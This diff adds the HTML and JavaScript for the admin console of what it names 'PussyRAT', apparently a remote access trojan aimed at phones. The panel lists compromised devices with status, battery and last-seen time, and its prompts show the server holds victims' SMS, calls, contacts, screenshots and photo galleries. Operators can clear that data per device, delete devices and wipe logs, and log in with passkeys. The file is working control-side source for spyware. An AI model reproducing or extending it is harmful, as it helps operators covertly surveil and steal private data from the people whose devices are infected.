@@ -1,0 +1,794 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Admin Panel — PussyRAT</title>
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link href="https://fonts.googleapis.com/css2?family=Marcellus&family=Montserrat:ital,wght@0,100..900;1,100..900&family=Stack+Sans+Headline:wght@200..700&display=swap" rel="stylesheet" />
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  :root {
+    --bg:       #0c0c0c;
+    --surface:  #141414;
+    --border:   #252525;
+    --border-h: #3a3a3a;
+
+    /* Single accent: muted crimson */
+    --accent:     #b83228;
+    --accent-dim: rgba(184,50,40,0.10);
+
+    /* Status tones — desaturated, not neon */
+    --online:  #4e8f5e;
+    --warning: #9a7030;
+
+    /* Text hierarchy */
+    --text:   #e2ddd7;
+    --text-2: #807b75;
+    --text-3: #3e3b38;
+
+    --mono: 'Montserrat', monospace;
+    --serif: 'Marcellus', serif;
+    --sans: 'Montserrat', sans-serif;
+  }
+
+  html, body { height: 100%; }
+  body {
+    font-family: var(--sans);
+    background: var(--bg);
+    color: var(--text);
+    min-height: 100vh;
+    overflow-x: hidden;
+    -webkit-font-smoothing: antialiased;
+  }
+
+  /* ── Page shell ── */
+  .page { max-width: 1140px; margin: 0 auto; padding: 0 32px 96px; }
+
+  /* ── Topbar ── */
+  .topbar {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 24px 0 20px;
+    border-bottom: 1px solid var(--border);
+    margin-bottom: 52px;
+    gap: 16px;
+    flex-wrap: wrap;
+  }
+  .topbar-left { display: flex; align-items: center; gap: 18px; }
+  .topbar-wordmark {
+    font-family: var(--serif);
+    font-size: 21px;
+    color: var(--text);
+    letter-spacing: -0.2px;
+    line-height: 1;
+  }
+  .topbar-wordmark b { color: var(--accent); font-style: normal; font-weight: 400; }
+  .topbar-rule { width: 1px; height: 18px; background: var(--border); }
+  .topbar-sub {
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--text-3);
+    letter-spacing: 0.4px;
+  }
+  .topbar-logo {
+    width: 30px;
+    height: 30px;
+    border-radius: 3px;
+    overflow: hidden;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    opacity: 0.82;
+    flex-shrink: 0;
+    transition: opacity 0.15s;
+  }
+  .topbar-logo:hover { opacity: 1; }
+  .topbar-logo img { width: 100%; height: 100%; object-fit: contain; display: block; }
+  .topbar-right { display: flex; align-items: center; gap: 8px; }
+  .btn-nav {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    padding: 6px 14px;
+    border-radius: 3px;
+    font-size: 12px;
+    font-weight: 500;
+    font-family: var(--sans);
+    border: 1px solid var(--border);
+    background: transparent;
+    color: var(--text-2);
+    text-decoration: none;
+    cursor: pointer;
+    transition: border-color 0.15s, color 0.15s;
+    letter-spacing: 0.2px;
+  }
+  .btn-nav:hover { border-color: var(--border-h); color: var(--text); }
+
+  /* ── Stats row ── */
+  .stats-strip {
+    display: grid;
+    grid-template-columns: repeat(4, 1fr);
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    overflow: hidden;
+    margin-bottom: 60px;
+  }
+  .stat-card {
+    background: var(--surface);
+    padding: 26px 22px 22px;
+  }
+  .stat-card + .stat-card { border-left: 1px solid var(--border); }
+  .stat-label {
+    font-size: 10px;
+    font-weight: 600;
+    letter-spacing: 1.1px;
+    text-transform: uppercase;
+    color: var(--text-3);
+    margin-bottom: 12px;
+    font-family: 'Stack Sans Headline', 'Montserrat', sans-serif;
+  }
+  .stat-value {
+    font-family: var(--mono);
+    font-size: 30px;
+    font-weight: 500;
+    letter-spacing: -1px;
+    color: var(--text);
+    line-height: 1;
+  }
+  .stat-value.hi { color: var(--accent); }
+  .stat-sub {
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--text-3);
+    margin-top: 7px;
+  }
+
+  /* ── Sections ── */
+  .section { margin-bottom: 56px; }
+  .section-header {
+    display: flex;
+    align-items: baseline;
+    justify-content: space-between;
+    padding-bottom: 14px;
+    border-bottom: 1px solid var(--border);
+    margin-bottom: 20px;
+    flex-wrap: wrap;
+    gap: 12px;
+  }
+  .section-title {
+    font-family: var(--serif);
+    font-size: 17px;
+    color: var(--text);
+    letter-spacing: -0.1px;
+  }
+  .section-actions { display: flex; gap: 8px; flex-wrap: wrap; align-items: center; }
+
+  /* ── Card ── */
+  .card {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    overflow: hidden;
+  }
+
+  /* ── Table ── */
+  .device-table { width: 100%; border-collapse: collapse; }
+  .device-table th {
+    font-family: var(--sans);
+    font-size: 10px;
+    font-weight: 600;
+    letter-spacing: 1px;
+    text-transform: uppercase;
+    color: var(--text-3);
+    padding: 12px 20px;
+    text-align: left;
+    border-bottom: 1px solid var(--border);
+    background: var(--bg);
+  }
+  .device-table td {
+    padding: 16px 20px;
+    border-bottom: 1px solid var(--border);
+    vertical-align: middle;
+  }
+  .device-table tr:last-child td { border-bottom: none; }
+  .device-table tbody tr { transition: background 0.12s; }
+  .device-table tbody tr:hover { background: rgba(255,255,255,0.018); }
+  .device-model { font-weight: 500; font-size: 14px; color: var(--text); }
+  .device-uuid {
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--text-3);
+    margin-top: 3px;
+  }
+
+  /* ── Badge ── */
+  .badge {
+    display: inline-flex;
+    align-items: center;
+    gap: 5px;
+    padding: 3px 9px;
+    border-radius: 2px;
+    font-size: 11px;
+    font-weight: 500;
+    font-family: var(--mono);
+    letter-spacing: 0.2px;
+  }
+  .badge.online  { background: rgba(78,143,94,0.10); color: var(--online); border: 1px solid rgba(78,143,94,0.22); }
+  .badge.offline { background: rgba(62,59,56,0.20);  color: var(--text-3); border: 1px solid var(--border); }
+  .badge.online::before {
+    content: '';
+    width: 5px; height: 5px;
+    border-radius: 50%;
+    background: var(--online);
+    animation: pulse-dot 2s infinite;
+  }
+  @keyframes pulse-dot { 0%,100%{opacity:1} 50%{opacity:0.3} }
+
+  /* ── Buttons ── */
+  .actions-cell { display: flex; gap: 8px; align-items: center; flex-wrap: wrap; }
+  .btn {
+    display: inline-flex;
+    align-items: center;
+    gap: 5px;
+    padding: 7px 13px;
+    border-radius: 3px;
+    font-size: 12px;
+    font-weight: 500;
+    font-family: var(--sans);
+    border: 1px solid transparent;
+    cursor: pointer;
+    letter-spacing: 0.2px;
+    white-space: nowrap;
+    transition: background 0.14s, border-color 0.14s, color 0.14s;
+  }
+  .btn:disabled { opacity: 0.32; cursor: not-allowed; }
+
+  .btn-danger  { background: var(--accent-dim); border-color: rgba(184,50,40,0.28); color: var(--accent); }
+  .btn-danger:hover:not(:disabled)  { background: rgba(184,50,40,0.18); border-color: var(--accent); }
+
+  .btn-warning { background: rgba(154,112,48,0.10); border-color: rgba(154,112,48,0.25); color: #b08840; }
+  .btn-warning:hover:not(:disabled) { background: rgba(154,112,48,0.18); border-color: #b08840; }
+
+  .btn-primary { background: rgba(80,110,170,0.10); border-color: rgba(80,110,170,0.25); color: #7090c0; }
+  .btn-primary:hover:not(:disabled) { background: rgba(80,110,170,0.18); border-color: #7090c0; }
+
+  .btn-ghost   { background: transparent; border-color: var(--border); color: var(--text-2); }
+  .btn-ghost:hover:not(:disabled) { border-color: var(--border-h); color: var(--text); }
+
+  .btn-success { background: rgba(78,143,94,0.10); border-color: rgba(78,143,94,0.22); color: var(--online); }
+  .btn-success:hover:not(:disabled) { background: rgba(78,143,94,0.18); border-color: var(--online); }
+
+  /* ── Empty/ctrl states ── */
+  .empty-state {
+    padding: 44px 20px;
+    text-align: center;
+    color: var(--text-3);
+    font-family: var(--mono);
+    font-size: 13px;
+  }
+  .ctrl-row { display: flex; gap: 10px; flex-wrap: wrap; padding: 20px; }
+
+  /* ── Passkey credential rows ── */
+  .cred-item {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    padding: 10px 14px;
+    border: 1px solid var(--border);
+    border-radius: 3px;
+    background: var(--bg);
+  }
+  .cred-id {
+    flex: 1;
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--text-2);
+  }
+
+  /* ── Toast ── */
+  #toast-container { position: fixed; bottom: 28px; right: 28px; z-index: 9999; display: flex; flex-direction: column; gap: 8px; }
+  .toast {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    padding: 11px 16px;
+    font-size: 13px;
+    font-weight: 500;
+    font-family: var(--sans);
+    min-width: 240px;
+    max-width: 360px;
+    animation: toast-in 0.22s ease;
+  }
+  .toast.success { border-color: rgba(78,143,94,0.35); }
+  .toast.error   { border-color: rgba(184,50,40,0.45); }
+  .toast.info    { border-color: var(--border-h); }
+  .toast-icon { font-size: 14px; flex-shrink: 0; }
+  @keyframes toast-in  { from{opacity:0;transform:translateY(8px)} to{opacity:1;transform:none} }
+  @keyframes toast-out { to{opacity:0;transform:translateY(8px)} }
+
+  /* ── Modal ── */
+  .modal-overlay {
+    position: fixed; inset: 0;
+    background: rgba(0,0,0,0.78);
+    z-index: 1000;
+    display: flex; align-items: center; justify-content: center;
+    opacity: 0; pointer-events: none;
+    transition: opacity 0.18s;
+  }
+  .modal-overlay.open { opacity: 1; pointer-events: auto; }
+  .modal {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    padding: 36px 32px;
+    max-width: 420px; width: 90%;
+    transform: translateY(8px);
+    transition: transform 0.18s;
+  }
+  .modal-overlay.open .modal { transform: translateY(0); }
+  .modal-icon { font-size: 22px; margin-bottom: 14px; color: var(--accent); font-family: var(--mono); }
+  .modal-title { font-family: var(--serif); font-size: 20px; color: var(--text); margin-bottom: 10px; }
+  .modal-body { font-size: 13px; color: var(--text-2); line-height: 1.65; margin-bottom: 22px; font-family: var(--sans); }
+  .modal-body code {
+    font-family: var(--mono);
+    background: var(--accent-dim);
+    padding: 2px 6px;
+    border-radius: 2px;
+    color: var(--accent);
+    font-size: 12px;
+  }
+  .modal-confirm-input {
+    background: var(--bg);
+    border: 1px solid var(--border);
+    border-radius: 3px;
+    color: var(--text);
+    font-family: var(--mono);
+    font-size: 13px;
+    padding: 10px 12px;
+    outline: none;
+    width: 100%;
+    margin-bottom: 20px;
+    transition: border-color 0.14s;
+  }
+  .modal-confirm-input:focus { border-color: var(--accent); }
+  .modal-actions { display: flex; gap: 10px; justify-content: flex-end; }
+
+  /* ── Spinner ── */
+  .spin {
+    display: inline-block;
+    width: 12px; height: 12px;
+    border: 1.5px solid rgba(255,255,255,0.12);
+    border-top-color: currentColor;
+    border-radius: 50%;
+    animation: spin 0.65s linear infinite;
+  }
+  @keyframes spin { to{transform:rotate(360deg)} }
+
+  /* ── Misc ── */
+  .divider { border: none; border-top: 1px solid var(--border); margin: 0; }
+  ::-webkit-scrollbar { width: 4px; }
+  ::-webkit-scrollbar-track { background: transparent; }
+  ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 2px; }
+
+  @media (max-width: 680px) {
+    .stats-strip { grid-template-columns: repeat(2,1fr); }
+    .stat-card + .stat-card { border-left: none; border-top: 1px solid var(--border); }
+    .page { padding: 0 20px 72px; }
+  }
+</style>
+<script src="https://cdn.jsdelivr.net/npm/@simplewebauthn/browser@8/dist/bundle/index.es5.umd.min.js"></script>
+</head>
+<body>
+<div id="toast-container"></div>
+
+<!-- Delete Confirm Modal -->
+<div class="modal-overlay" id="delete-modal">
+  <div class="modal">
+    <div class="modal-icon">!</div>
+    <div class="modal-title">Permanently Delete Device?</div>
+    <div class="modal-body">
+      This will remove <code id="delete-device-name">device</code> from the server permanently,
+      including all cached data. The device UUID will be completely forgotten.<br><br>
+      Type <code>DELETE</code> below to confirm.
+    </div>
+    <input class="modal-confirm-input" id="delete-confirm-input" placeholder="DELETE" autocomplete="off" />
+    <div class="modal-actions">
+      <button class="btn btn-ghost" onclick="closeDeleteModal()">Cancel</button>
+      <button class="btn btn-danger" id="delete-confirm-btn" onclick="confirmDelete()" disabled>Delete Forever</button>
+    </div>
+  </div>
+</div>
+
+<div class="page">
+
+  <!-- Topbar -->
+  <div class="topbar">
+    <div class="topbar-left">
+      <div class="topbar-logo">
+        <img src="https://pub-3ab59b8f25ba43769d968211da80e759.r2.dev/brand/zidhuxd-icon-white.png" alt="Brand" />
+      </div>
+      <div class="topbar-wordmark">Admin<b>.</b></div>
+      <div class="topbar-rule"></div>
+      <div class="topbar-sub" id="topbar-pid">PID: —</div>
+    </div>
+    <div class="topbar-right">
+      <a class="btn-nav" href="/">← Dashboard</a>
+      <a class="btn-nav" href="/logout">Sign Out</a>
+    </div>
+  </div>
+
+  <!-- Stats -->
+  <div class="stats-strip">
+    <div class="stat-card">
+      <div class="stat-label">Total Devices</div>
+      <div class="stat-value" id="stat-total">—</div>
+      <div class="stat-sub">All-time known</div>
+    </div>
+    <div class="stat-card">
+      <div class="stat-label">Online Now</div>
+      <div class="stat-value" id="stat-online">—</div>
+      <div class="stat-sub">Active connections</div>
+    </div>
+    <div class="stat-card">
+      <div class="stat-label">Uptime</div>
+      <div class="stat-value" id="stat-uptime">—</div>
+      <div class="stat-sub" id="stat-uptime-sub">Server process</div>
+    </div>
+    <div class="stat-card">
+      <div class="stat-label">Memory</div>
+      <div class="stat-value hi" id="stat-mem">—</div>
+      <div class="stat-sub" id="stat-mem-sub">Heap usage</div>
+    </div>
+  </div>
+
+  <!-- Device Management -->
+  <div class="section">
+    <div class="section-header">
+      <div class="section-title">Device Management</div>
+      <div class="section-actions">
+        <button class="btn btn-warning" onclick="clearAllCaches()">Clear All Caches</button>
+        <button class="btn btn-ghost" onclick="loadDevices()">↻ Refresh</button>
+      </div>
+    </div>
+    <div class="card">
+      <table class="device-table">
+        <thead>
+          <tr>
+            <th>Device</th>
+            <th>Status</th>
+            <th>Battery</th>
+            <th>Last Seen</th>
+            <th>Actions</th>
+          </tr>
+        </thead>
+        <tbody id="device-tbody">
+          <tr><td colspan="5" class="empty-state"><span class="spin"></span>&nbsp; Loading devices…</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+
+  <!-- Server Controls -->
+  <div class="section">
+    <div class="section-header">
+      <div class="section-title">Server Controls</div>
+    </div>
+    <div class="card">
+      <div class="ctrl-row">
+        <button class="btn btn-warning" onclick="clearAllLogs()">Wipe All Logs</button>
+        <button class="btn btn-ghost" onclick="loadStats()">↻ Refresh Stats</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Passkey Auth -->
+  <div class="section">
+    <div class="section-header">
+      <div class="section-title">Passkey Authentication</div>
+    </div>
+    <div class="card">
+      <div style="padding:20px 20px 0;">
+        <div id="wa-support-banner" style="display:none;padding:10px 14px;border-radius:3px;font-size:12px;margin-bottom:16px;font-family:var(--mono);line-height:1.5;"></div>
+      </div>
+      <div style="padding:0 20px 18px;">
+        <div style="font-size:10px;font-weight:600;letter-spacing:1px;text-transform:uppercase;color:var(--text-3);margin-bottom:12px;font-family:var(--sans);">Registered Devices</div>
+        <div id="wa-cred-list" style="display:flex;flex-direction:column;gap:8px;">
+          <div style="color:var(--text-3);font-size:13px;font-family:var(--mono);"><span class="spin"></span>&nbsp; Loading…</div>
+        </div>
+      </div>
+      <hr class="divider" />
+      <div style="padding:16px 20px;display:flex;align-items:center;gap:14px;flex-wrap:wrap;">
+        <button class="btn btn-primary" id="wa-register-btn" onclick="registerPasskey()">Register This Device</button>
+        <span style="font-size:11px;color:var(--text-3);font-family:var(--mono);">Touch ID · Face ID · Windows Hello · PIN</span>
+      </div>
+    </div>
+  </div>
+
+</div>
+
+<script>
+let pendingDeleteUUID = null;
+let _uptimeBase = null; // { secs: number, fetchedAt: DOMHighResTimeStamp }
+
+function toast(msg, type = 'info', duration = 3500) {
+  const icons = { success: '✓', error: '✕', info: '·', warning: '!' };
+  const el = document.createElement('div');
+  el.className = 'toast ' + type;
+  el.innerHTML = '<span class="toast-icon">' + (icons[type]||'·') + '</span><span>' + msg + '</span>';
+  document.getElementById('toast-container').appendChild(el);
+  setTimeout(() => {
+    el.style.animation = 'toast-out 0.22s ease forwards';
+    setTimeout(() => el.remove(), 220);
+  }, duration);
+}
+
+function fmtUptime(sec) {
+  const h = Math.floor(sec / 3600), m = Math.floor((sec % 3600) / 60), s = sec % 60;
+  if (h > 0) return h + 'h ' + m + 'm ' + String(s).padStart(2,'0') + 's';
+  if (m > 0) return m + 'm ' + String(s).padStart(2,'0') + 's';
+  return s + 's';
+}
+
+// Live-tick the uptime display every second from a local base
+(function startUptimeTicker() {
+  setInterval(() => {
+    if (!_uptimeBase) return;
+    const elapsed = Math.floor((performance.now() - _uptimeBase.fetchedAt) / 1000);
+    const live = _uptimeBase.secs + elapsed;
+    document.getElementById('stat-uptime').textContent = fmtUptime(live);
+  }, 1000);
+})();
+
+function fmtLastSeen(ts) {
+  if (!ts) return '—';
+  const diff = Date.now() - ts;
+  if (diff < 60000) return 'Just now';
+  if (diff < 3600000) return Math.floor(diff/60000) + 'm ago';
+  if (diff < 86400000) return Math.floor(diff/3600000) + 'h ago';
+  return new Date(ts).toLocaleDateString();
+}
+
+function escH(s) {
+  return String(s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
+}
+function escA(s) { return String(s).replace(/'/g, "\\'"); }
+
+async function loadStats() {
+  try {
+    const r = await fetch('/api/admin/stats');
+    if (r.status === 401 || r.status === 302) { location.href = '/login'; return; }
+    const d = await r.json();
+    document.getElementById('stat-total').textContent = d.totalDevices;
+    document.getElementById('stat-online').textContent = d.onlineDevices;
+    // Seed the live-ticker base so the 1s interval can count forward
+    _uptimeBase = { secs: d.uptimeSeconds, fetchedAt: performance.now() };
+    document.getElementById('stat-uptime').textContent = fmtUptime(d.uptimeSeconds);
+    document.getElementById('stat-mem').textContent = d.memoryMB + 'MB';
+    document.getElementById('stat-mem-sub').textContent = 'Heap: ' + d.heapUsedMB + 'MB';
+    document.getElementById('topbar-pid').textContent = 'PID: ' + d.pid;
+  } catch(e) {}
+}
+
+async function loadDevices() {
+  const tbody = document.getElementById('device-tbody');
+  tbody.innerHTML = '<tr><td colspan="5" class="empty-state"><span class="spin"></span>&nbsp; Loading…</td></tr>';
+  try {
+    const r = await fetch('/api/devices');
+    const list = await r.json();
+    if (!list.length) {
+      tbody.innerHTML = '<tr><td colspan="5" class="empty-state">No devices registered with the server.</td></tr>';
+      return;
+    }
+    tbody.innerHTML = list.map(d => {
+      const statusBadge = d.online
+        ? '<span class="badge online">Online</span>'
+        : '<span class="badge offline">Offline</span>';
+      const battery = d.battery != null ? d.battery + '%' : '—';
+      const model = d.model || 'Unknown Device';
+      const uuid = d.uuid || '';
+      const short = uuid.length > 16 ? uuid.slice(0,8) + '…' + uuid.slice(-6) : uuid;
+      return '<tr>' +
+        '<td><div class="device-model">' + escH(model) + '</div><div class="device-uuid" title="' + escH(uuid) + '">' + escH(short) + '</div></td>' +
+        '<td>' + statusBadge + '</td>' +
+        '<td style="font-family:var(--mono);font-size:13px;color:var(--text-2);">' + escH(battery) + '</td>' +
+        '<td style="font-family:var(--mono);font-size:11px;color:var(--text-3);">' + fmtLastSeen(d.lastSeen||0) + '</td>' +
+        '<td><div class="actions-cell">' +
+          '<button class="btn btn-warning" onclick="clearDeviceCache(\'' + escA(uuid) + '\',\'' + escA(model) + '\')">Clear Cache</button>' +
+          '<button class="btn btn-danger"  onclick="openDeleteModal(\'' + escA(uuid) + '\',\'' + escA(model) + '\')">Delete</button>' +
+        '</div></td>' +
+      '</tr>';
+    }).join('');
+  } catch(e) {
+    tbody.innerHTML = '<tr><td colspan="5" class="empty-state">Failed to load devices.</td></tr>';
+  }
+}
+
+function openDeleteModal(uuid, model) {
+  pendingDeleteUUID = uuid;
+  document.getElementById('delete-device-name').textContent = model || uuid;
+  document.getElementById('delete-confirm-input').value = '';
+  document.getElementById('delete-confirm-btn').disabled = true;
+  document.getElementById('delete-modal').classList.add('open');
+}
+function closeDeleteModal() {
+  pendingDeleteUUID = null;
+  document.getElementById('delete-modal').classList.remove('open');
+}
+document.getElementById('delete-confirm-input').addEventListener('input', function() {
+  document.getElementById('delete-confirm-btn').disabled = this.value !== 'DELETE';
+});
+document.getElementById('delete-modal').addEventListener('click', function(e) {
+  if (e.target === this) closeDeleteModal();
+});
+
+async function confirmDelete() {
+  if (!pendingDeleteUUID) return;
+  const btn = document.getElementById('delete-confirm-btn');
+  btn.disabled = true;
+  btn.innerHTML = '<span class="spin"></span> Deleting…';
+  try {
+    const r = await fetch('/api/admin/delete-device', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ uuid: pendingDeleteUUID })
+    });
+    const d = await r.json();
+    if (d.success) {
+      toast('Device permanently deleted.', 'success');
+      closeDeleteModal();
+      loadDevices();
+      loadStats();
+    } else {
+      toast('Delete failed: ' + (d.error || 'Unknown error'), 'error');
+    }
+  } catch(e) { toast('Network error.', 'error'); }
+  finally {
+    btn.disabled = false;
+    btn.textContent = 'Delete Forever';
+  }
+}
+
+async function clearDeviceCache(uuid, model) {
+  if (!confirm('Clear all cached data for "' + model + '"?\n(Logs, SMS, calls, contacts, screenshots, gallery)')) return;
+  try {
+    const r = await fetch('/api/admin/clear-cache', {
+      method: 'POST', headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ uuid })
+    });
+    const d = await r.json();
+    toast(d.success ? 'Cache cleared for ' + model + '.' : (d.error || 'Failed'), d.success ? 'success' : 'error');
+  } catch(e) { toast('Network error.', 'error'); }
+}
+
+async function clearAllCaches() {
+  if (!confirm('Clear ALL cached data for ALL devices?\nThis wipes logs, SMS, calls, contacts, gallery and screenshots.')) return;
+  try {
+    const r = await fetch('/api/admin/clear-cache', {
+      method: 'POST', headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({})
+    });
+    const d = await r.json();
+    toast(d.success ? 'Caches cleared for ' + d.cleared + ' device(s).' : 'Failed', d.success ? 'success' : 'error');
+  } catch(e) { toast('Network error.', 'error'); }
+}
+
+async function clearAllLogs() {
+  if (!confirm('Wipe ALL in-memory logs for ALL devices?')) return;
+  try {
+    const r = await fetch('/api/admin/clear-cache', {
+      method: 'POST', headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({})
+    });
+    const d = await r.json();
+    toast(d.success ? 'All logs wiped.' : 'Failed', d.success ? 'success' : 'error');
+  } catch(e) { toast('Network error.', 'error'); }
+}
+
+loadStats();
+loadDevices();
+loadWebauthnCredentials();
+setInterval(loadStats, 30000);
+setInterval(loadDevices, 30000);
+
+/* ── WebAuthn ── */
+const { startRegistration, startAuthentication } = SimpleWebAuthnBrowser;
+
+async function loadWebauthnCredentials() {
+  const list   = document.getElementById('wa-cred-list');
+  const banner = document.getElementById('wa-support-banner');
+
+  if (!window.PublicKeyCredential) {
+    banner.style.cssText = 'display:block;background:var(--accent-dim);border:1px solid rgba(184,50,40,0.3);color:var(--accent);';
+    banner.textContent = 'This browser does not support WebAuthn. Use Chrome, Safari, or Edge.';
+    document.getElementById('wa-register-btn').disabled = true;
+    return;
+  }
+
+  const isAvailable = await PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable().catch(() => false);
+  if (!isAvailable) {
+    banner.style.cssText = 'display:block;background:rgba(154,112,48,0.10);border:1px solid rgba(154,112,48,0.25);color:#b08840;';
+    banner.textContent = 'No platform authenticator found. Touch ID or Windows Hello may not be available on this device.';
+  } else {
+    banner.style.display = 'none';
+  }
+
+  try {
+    const r = await fetch('/api/webauthn/login-options');
+    const d = await r.json();
+    const creds = (d.allowCredentials || []).map(c => ({ ...c, id: typeof c.id === 'string' ? c.id : '' }));
+    if (!creds.length) {
+      list.innerHTML = '<div style="color:var(--text-3);font-size:13px;font-family:var(--mono);">No devices registered yet.</div>';
+    } else {
+      list.innerHTML = creds.map((c, i) => {
+        const short = c.id.slice(0,8) + '…' + c.id.slice(-6);
+        return '<div class="cred-item">' +
+          '<span style="font-family:var(--mono);font-size:14px;color:var(--text-3);">◉</span>' +
+          '<span class="cred-id">Device ' + (i+1) + ' &nbsp;·&nbsp; <span title="' + escH(c.id) + '">' + escH(short) + '</span></span>' +
+          '<button class="btn btn-danger" style="padding:5px 10px;font-size:11px;" onclick="removeWebauthnCredential(\'' + escA(c.id) + '\')">Remove</button>' +
+        '</div>';
+      }).join('');
+    }
+  } catch(e) {
+    list.innerHTML = '<div style="color:var(--text-3);font-size:13px;font-family:var(--mono);">Could not load credential list.</div>';
+  }
+}
+
+async function registerPasskey() {
+  const btn = document.getElementById('wa-register-btn');
+  if (!window.PublicKeyCredential) return toast('WebAuthn not supported in this browser.', 'error');
+  btn.disabled = true;
+  btn.innerHTML = '<span class="spin"></span> Waiting for Touch ID…';
+  try {
+    // 1. Get options from server (POST, returns options + nonce)
+    const optRes = await fetch('/api/webauthn/register-options', { method: 'POST' });
+    if (optRes.status === 401) { location.href = '/login'; return; }
+    const { nonce, ...regOptions } = await optRes.json();
+    // 2. Library handles all ArrayBuffer/base64url conversion & calls Touch ID / Windows Hello
+    const attResp = await startRegistration(regOptions);
+    // 3. Send attestation + nonce to server for cryptographic verification
+    const verifyRes = await fetch('/api/webauthn/register-verify', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ nonce, ...attResp })
+    });
+    const result = await verifyRes.json();
+    if (!result.success) throw new Error(result.error || 'Server rejected registration');
+    toast('Device registered. Touch ID / Windows Hello active on login.', 'success', 5000);
+    loadWebauthnCredentials();
+  } catch(err) {
+    const msgs = {
+      NotAllowedError:   'Cancelled or timed out. Try again.',
+      InvalidStateError: 'This device is already registered. Remove it first.',
+      SecurityError:     'Blocked — requires HTTPS or localhost.',
+      NotSupportedError: 'No compatible authenticator found on this device.'
+    };
+    toast(msgs[err.name] || 'Error: ' + (err.message || err.name), 'error', 5000);
+  } finally {
+    btn.disabled = false;
+    btn.innerHTML = 'Register This Device';
+  }
+}
+
+async function removeWebauthnCredential(credentialId) {
+  if (!confirm('Remove this device passkey? You will need to re-register to use Touch ID login again.')) return;
+  try {
+    const r = await fetch('/api/webauthn/remove', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ credentialID: credentialId })
+    });
+    const d = await r.json();
+    toast(d.success ? 'Passkey removed.' : (d.error || 'Failed'), d.success ? 'success' : 'error');
+    loadWebauthnCredentials();
+  } catch(e) { toast('Network error.', 'error'); }
+}
+</script>
+</body>
+</html>
